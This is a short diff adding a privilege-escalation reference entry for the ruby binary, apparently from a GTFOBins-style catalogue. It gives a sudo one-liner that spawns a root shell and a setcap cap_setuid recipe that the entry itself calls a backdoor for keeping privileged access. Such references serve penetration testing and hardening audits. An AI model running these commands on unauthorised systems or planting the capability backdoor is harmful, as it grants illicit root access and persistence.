@@ -1,0 +1,13 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * sudo ruby -e 'exec "/bin/sh"'
+***** Capabilities *****
+If the binary has the Linux CAP_SETUID capability set or it is executed by
+another binary with the capability set, it can be used as a backdoor to
+maintain privileged access by manipulating its own process UID.
+    * cp $(which ruby) .
+      sudo setcap cap_setuid+ep ruby
+
+      ./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
